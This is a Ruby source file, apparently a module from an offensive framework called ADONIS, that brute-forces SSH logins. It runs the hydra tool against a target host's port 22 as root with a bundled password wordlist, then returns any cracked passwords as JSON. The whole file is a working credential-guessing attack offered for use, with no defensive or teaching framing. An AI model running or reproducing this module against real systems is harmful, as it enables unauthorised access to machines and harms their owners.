#encoding: utf-8

require 'thread'

module ADONIS
module MODULE
module EXPLOIT

class Ssh < ::ADONIS::EXPLOIT::Base

    def init
        module_id = "4001"
        module_name = "ssh_brute_fource_login"
        module_desc = "SSH暴力破解"
        port_str = "tcp_22"
        update_info(module_id, module_name, module_desc, port_str, false)
        @cmd = File.join(::ADONIS::BinDir, "hydra")
        @passwd_file = File.join(::ADONIS::DataDir, "local_wordlists/ssh.txt")
        @args = "-l root -P #{@passwd_file} -t 4 -e ns"
        return self
    end

    def exploit_fuc host
        ::ADONIS.exploit_logger.info("ADONIS::MODULE::EXPLOIT::ssh_brute_fource_login, #{@info[:id]}: #{host.ip}")
        command = "#{@cmd} #{@args} #{host.ip} ssh"
        p command

        out = `#{command}`
        
        password_list = ::ADONIS::EXPLOIT::Hydra.check out
        
        if password_list.nil? 
            return nil
        else
            return password_list.to_json
        end
    end

    def control_fuc ip
        return nil
    end

end

end
end
end

